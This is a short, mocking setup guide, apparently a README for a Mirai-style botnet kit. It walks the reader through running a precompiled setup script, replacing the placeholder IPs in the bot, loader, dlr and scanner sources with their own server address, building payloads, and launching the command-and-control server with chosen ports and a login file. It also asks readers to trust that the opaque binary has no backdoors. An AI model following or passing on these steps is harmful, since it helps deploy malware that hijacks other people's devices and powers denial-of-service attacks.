TO MAKE IT EASIER FOR YOU IDIOTS I MADE THIS SCRIPT. I COMPILED IT SO YALL CAN'T TAKE THE CODE AND SKID RIP IT FOR YOURSELVES AND NO WORRIES NO BACKDOORS OR NOTHING
YOULL CLEARLY SEE IT IF THERE IS. 
JUST DO chmod 777 * then ./wip
obviously install dependencies first. then download architectures. 
then what you want to do is edit the ips in these following files. (just look for "0.0.0.0" and replace all the ips to your server ip)
bot/main.c
dlr/main.c
loader/src/main.c
loader/src/headers/config.h
tools/scanListen.go

now rerun my script ./wip
once done. do ./payload
type in your server ip and wallah done

now just go into cnc directory by doing cd cnc
then final command is screen ./cnc <bot-port> <threads> <cnc-port> 
(botport is the port in the main.c right next to the ip)
(cncport is the port you connect with)
and don't forget to make your login in login.txt!

I made this extrememly easy for everybody, your welcome.
